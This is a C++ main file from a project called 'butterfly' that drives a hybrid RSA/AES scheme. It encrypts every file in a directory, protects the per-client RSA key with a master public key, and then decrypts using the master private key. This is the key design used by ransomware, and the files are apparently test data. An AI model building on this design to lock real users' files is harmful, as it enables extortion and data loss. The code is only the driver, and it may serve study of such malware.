
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "aesKeyDatabase.h"


void test_rsa()
{
    // Init rsaEncryptAESKey with keysize 2048
    butterfly::rsa::RSAEncryptor rsaEncryptAESKey = butterfly::rsa::RSAEncryptor(2048);
    // Init rsaEncryptCPrivateRSA with keysize of SPUBLIC_PEM
    butterfly::rsa::RSAEncryptor rsaEncryptCPrivateRSA = butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM);

    // Get the CPrivateRSA.pem file string
    std::string cprivateRSAKeyFile = rsaEncryptAESKey.getRSAPrivateKeyStr();

    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA.encrypt(rsaEncryptCPrivateRSA.getEvpPkey(), cprivateRSAKeyFile.substr(0, cprivateRSAKeyFile.size() - 1));
    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA.getEncryptedKey();

    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA.saveEncryptedKeyFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, rsaEncryptCPrivateRSA.getEvpPkeySize(rsaEncryptCPrivateRSA.getEvpPkey()));


};


int main(int argc, char *argv[])
{
    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
    std::cout << argc << argv <<std::endl;
    //test_rsa();

    std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
    encryptor->invokeDir("/home/christian/projects/butterfly/bin/data");
    sleep(5);
    std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem", butterfly::ENC_CPRIVATERSA_FILENAME);
    decryptor->invokeDir("/home/christian/projects/butterfly/bin/data");

    /*
    std::unique_ptr<butterfly::AESKeyDatabase> _database(new butterfly::AESKeyDatabase("AES.db", false));

    _database->print();
    _database->insertEntry("/home/christian/", "abc", "defg");

    _database->getEntry("/home/christian/");

    std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());
    dirIterator->getAllFiles("/home/christian/");
     */
    /*
    /////// Hybrid Part ////////

    // start encryption
    std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));

    encryptor->encryptCPrivateRSA();
    encryptor->encryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf");

    encryptor->encryptAESKeyFile("AESKey.txt");


    sleep(10);

    // start decryption
    std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    std::string aesKey = decryptor->decryptAESKey(cprivate, "AESKey.bin");
    decryptor->decryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf", aesKey);

    */
    ////// AES PART ///////
    /*
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
    butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
    std::string s = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesEncryptor->encryptFile(s);
    */

    /*
    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    std::string aeskey = butterfly::readBinFile("AESKey.txt");
    std::string aesiv = butterfly::readBinFile("AESIv.txt");
    aesDecryptor->setAESKey(aeskey);
    aesDecryptor->setAESIv(aesiv);
    std::string s = "/home/christian/projects/butterfly/bin/test.pdf.bfly";
    aesDecryptor->decryptFile(s);
    */
    
     return 0;
}